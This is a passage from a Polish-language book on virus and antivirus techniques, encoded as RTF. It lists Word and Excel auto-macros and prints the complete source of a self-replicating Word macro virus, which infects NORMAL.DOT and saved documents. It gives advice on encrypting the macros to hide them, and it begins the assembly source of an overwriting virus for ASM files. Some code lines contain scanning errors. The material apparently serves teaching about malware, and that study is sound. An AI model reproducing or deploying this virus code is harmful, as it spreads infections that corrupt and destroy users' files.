\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}AutoOpen}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}uruchamiane podczas otwierania dokumentu }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1827\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}AutoClose}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}uruchamiane podczas zamykania dokumentu}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1827\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}AutoExit}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}uruchamiane podczas ko\uc1\u324\'f1czenia pracy z Wordem}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Przyk\uc1\u322\'b3adem prostego wirusa dla dokument\'f3w Worda mo\uc1\u380\'bfe by\uc1\u263\'e6 poni\uc1\u380\'bfszy program, kt\'f3ry sk\uc1\u322\'b3ada si\uc1\u281\'ea z dw\'f3ch makr: FileSave i AutoOpen. Pierwsze z nich s\uc1\u322\'b3u\uc1\u380\'bfy do infekcji plik\'f3w DOC podczas ich zachowywania, natomiast drugie dopisuje do szablonu NORMAL.DOT dwa powy\uc1\u380\'bfsze makra bezpo\uc1\u347\'9crednio po otwarciu zainfekowaneg}{\f1\fs24\lang1045{\*\listtag0}o}{\f0\fs24\lang1045{\*\listtag0} dokumentu (w rezultacie instaluje go rezydentnie w Wordzie). Aby wirus zbudowany z powy\uc1\u380\'bfszych makr zadzia\uc1\u322\'b3a\uc1\u322\'b3, nale\uc1\u380\'bfy je umie\uc1\u347\'9cci\uc1\u263\'e6 w dowolnym (najlepiej nowym) dokumencie. Operacj\uc1\u281\'ea t\uc1\u281\'ea najpro\uc1\u347\'9cciej przeprowadzi\uc1\u263\'e6 przy pomocy opcji NARZ\uc1\u280\'caDZIA/MAKRO/UTW\'d3RZ, Poni\uc1\u380\'bfsze makra zawieraj\uc1\u261\'b9 fragmenty kodu, umo\uc1\u380\'bfliwiaj\uc1\u261\'b9ce kontrolowane uruchamianie wirusa (wirus prosi u\uc1\u380\'bfytkownika o potwierdzenie wszystkich wykonywanych przez siebie operacji).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Zawarto\uc1\u347\'9c\uc1\u263\'e6 makra: AutoOpen}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Sub MAIN}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch On Error Goto AutoOpen_Error}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tyt$ = "Nowoczesne techniki wirusowe i antywirusowe,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Autor Adam B\uc1\u322\'b3aszczyk"}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Uwg$ = "Uwaga MakroWirus, Chcesz go zainstalowa\uc1\u263\'e6 ?" TiN = 256 +48+4 Prz = MsgBox(Uwg$, Tyt$, TiN) If (Prz = - l) Then MacroCopy WindowName$() + ":AutoOpen",}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch "Globalne:AutoOpen" MacroCopy WindowName$() + ":FileSave",}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch "Globalne:FileSave"}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MsgBox "Wirus dopisa\uc1\u322\'b3 si\uc1\u281\'ea do NORMAL.DOT, Sam tego chcia\uc1\u322\'b3e\uc1\u347\'9c !!!", Tyt$, 64}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch End If AutoOpen_Error:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch End Sub}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Zawarto\uc1\u347\'9c\uc1\u263\'e6 makra: FileSave}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Sub MA1N FileSave On Error Goto FileSave_Error}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tyt$ = "Nowoczesne techniki wirusowe i antywirusowe,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Autor Adan B\uc1\u322\'b3aszczyk" Uwg$ = "Czy chcesz zainfekowa\uc1\u263\'e6 '" + WindowName$() + "'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch makrowirusem ?"}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TiN = 256 +48+4}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Prz = MsgBox(Uwg$, Tyt$, TiN)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch If (Prz = - 1) Then}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MacroCopy "Globalne:AutoOpen", WindowName$() +}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ":AutoOpen" MacroCopy "Globalne: FileSave" , WindowName$ () +}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ":FileSave" FileSaveAs .Format - l}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tek$ = "Wirus dopisa\uc1\u322\'b3 si\uc1\u281\'ea do '" + WindowName$() + "'" MsgBox Tek$, Tyt$, 64 FileSave}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch End lf}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch rem fileSave}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch FileSave_Error:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch End Sub}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Powy\uc1\u380\'bfszy wirus zadzia\uc1\u322\'b3a tylko w polskoj\uc1\u281\'eazycznej wersji MS Word (w wersjach dla innych j\uc1\u281\'eazyk\'f3w zmieniaj\uc1\u261\'b9 si\uc1\u281\'ea nazwy procedur oraz szablon\'f3w).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ze wzgl\uc1\u281\'eadu na oferowan\uc1\u261\'b9 przez Worda mo\uc1\u380\'bfliwo\uc1\u347\'9c\uc1\u263\'e6 szyfrowania makr powy\uc1\u380\'bfszego wirusa mo\uc1\u380\'bfna w pewnym sensie uczyni\uc1\u263\'e6 niewidzialnym (pewna forma techniki stealth). Nale\uc1\u380\'bfy w tym celu doda\uc1\u263\'e6 do polecenia MacroCopy \uc1\u322\'b3a\uc1\u324\'f1cuch 1, kt\'f3ry oznacza, i\uc1\u380\'bf podczas kopiowania makra b\uc1\u281\'ead\uc1\u261\'b9 zaszyfrowane. U\uc1\u380\'bfytkownik nie b\uc1\u281\'eadzie m\'f3g\uc1\u322\'b3 obejrze\uc1\u263\'e6 w edytorze zawarto\uc1\u347\'9cci takich makr.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.7. Pliki XLS}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Podobnie jak pliki DOC r\'f3wnie\uc1\u380\'bf arkusze Excela mog\uc1\u261\'b9 zawiera\uc1\u263\'e6 w sobie definicje makr, kt\'f3re mo\uc1\u380\'bfe zdefinowa\uc1\u263\'e6 lub przedefiniowa\uc1\u263\'e6 wirus. R\'f3\uc1\u380\'bfnica w stosunku do programu MS Word polega na tym, \uc1\u380\'bfe rol\uc1\u281\'ea pliku NORMAL.DOT z Worda pe\uc1\u322\'b3ni tu plik PERSONAL.XLS, inne jest te\uc1\u380\'bf nazewnictwo makr. Sam spos\'f3}{\f1\fs24\lang1045{\*\listtag0}b}{\f0\fs24\lang1045{\*\listtag0} dzia\uc1\u322\'b3ania jest w zasadzie identyczny. Poni\uc1\u380\'bfsza tabela zawiera kr\'f3tki opis makr automatycznych, dost\uc1\u281\'eapnych w Excelu.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Makra MS Excela o ustalonym znaczeniu}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:3.2939in/3.2946in/; table-sdh:89528f8}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Nazwa makra}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Opis makra}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}auto_open }\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}uruchamiane podczas rozpoczynania pracy z Excelem}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}auto_close }\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}uruchamiane podczas zamykania arkusza}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.8. Pliki ASM}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Zwykle wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 wirus\'f3w zara\uc1\u380\'bfa pliki opisane na poprzednich stronach tego rozdzia\uc1\u322\'b3u. Opr\'f3cz nich istnieje ma\uc1\u322\'b3a grupka wirus\'f3w, kt\'f3re infekuj\uc1\u261\'b9 pliki raczej nietypowe. Przyk\uc1\u322\'b3adem mog\uc1\u261\'b9 by\uc1\u263\'e6 tu pliki ASM. Infekcja plik\'f3w ASM polega na dodaniu wirusa do zara\uc1\u380\'bfanego pliku ASM, b\uc1\u261\'b9d\uc1\u378\'9f te\uc1\u380\'bf na nadpisaniu oryginalnego programu ofiary kodem wirusa w postaci \uc1\u378\'9fr\'f3d\uc1\u322\'b3owej. Czytaj\uc1\u261\'b9c ten tekst mo\uc1\u380\'bfna si\uc1\u281\'ea dziwi\uc1\u263\'e6, w jaki spos\'f3b program mo\uc1\u380\'bfe zna\uc1\u263\'e6, a tym bardziej transportowa\uc1\u263\'e6, sw\'f3j w\uc1\u322\'b3asny kod \uc1\u378\'9fr\'f3d\uc1\u322\'b3owy, kt\'f3ry ma p\'f3\uc1\u378\'9fniej do\uc1\u322\'b3\uc1\u261\'b9cza\uc1\u263\'e6 do ofiary. W rzeczywisto\uc1\u347\'9cci nie jest to takie trudne do zrealizowania. Uruchamialny, wykonuj\uc1\u261\'b9cy si\uc1\u281\'ea kod, kt\'f3ry powstaje z pliku ASM, ma posta\uc1\u263\'e6 binarn\uc1\u261\'b9, a wi\uc1\u281\'eac wirus zara\uc1\u380\'bfaj\uc1\u261\'b9cy plik ASM te\uc1\u380\'bf jest w takie}{\f1\fs24\lang1045{\*\listtag0}j}{\f0\fs24\lang1045{\*\listtag0} postaci. Ze wzgl\uc1\u281\'eadu na to, i\uc1\u380\'bf wirus ma doda\uc1\u263\'e6 do pliku sw\'f3j w\uc1\u322\'b3asny kod, najpro\uc1\u347\'9cciej przetworzy\uc1\u263\'e6 go na przyk\uc1\u322\'b3ad na posta\uc1\u263\'e6 szesnastkow\uc1\u261\'b9 (jako ci\uc1\u261\'b9g DB ??h/??h/.../??h), i w takiej postaci doda\uc1\u263\'e6 kod wirusa do zara\uc1\u380\'bfanego programu.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Poni\uc1\u380\'bfej przedstawiono przyk\uc1\u322\'b3ad prostego wirusa plik\'f3w ASM, nad-pisuj\uc1\u261\'b9cego (i w efekcie niszcz\uc1\u261\'b9cego pliki).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       Czesc ksiazki : "Nowoczesne techniki wirusowe i antywirusowe"        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                  ASMODEUS v1.0, Autor : Adam Blaszczyk 1997                ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Prosty wirus nierezydentny, nadpisujacy, atakujacy pliki ASM  ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Infekuje pliki z atrybutem Archive, ReadOnly, System, Hidden  ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Kompilacja :                                                               ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TASM     ASMODEUS.ASM                                          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TLINK /t ASMODEUS.OBJ                                          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch .286p}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ASMODEUS SEGMENT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JUMPS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          ASSUME CS:ASMODEUS, DS:ASMODEUS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          ORG 100h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     NUL          = 00h                     ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     LF           = 0Ah                     ;  \\ stale znakow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     CR           = 0Dh                     ;  / ASCII}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     DOLAR        = '$'                     ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrReadOnly  = 00000001b               ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrHidden    = 00000010b               ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrSystem    = 00000100b               ;   \\ rozne stale atrybutow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrVolumeID  = 00001000b               ;   / pozycji katalogu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrDirectory = 00010000b               ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrArchive   = 00100000b               ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Atrybut = AtrArchive + AtrReadOnly + AtrSystem + AtrHidden + AtrVolumeID}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; atrybut poszukiwanej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; katalogu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VirusDlug           = offset (VirusEnd-VirusStart)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; dlugosc kodu wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ASMNaglowek_Rozmiar = offset (ASMNaglowek_Koniec-ASMNaglowek_Start)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; dlugosc dyrekty z poczatku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; pliku ASM (ASSUME, ORG, itd.)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ASMKoncowka_Rozmiar = offset (ASMKoncowka_Koniec-ASMKoncowka_Start)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; dlugosc dyrekty z konca}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; pliku ASM (ENDS, END)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VRok          = 1998                       ; \\  data opisujaca}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VMiesiac      = 13                         ;  - pliki juz zainfekowane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VDzien        = 31                         ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VZnacznik     = (VRok-1980)*512+VMiesiac*32+VDzien}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
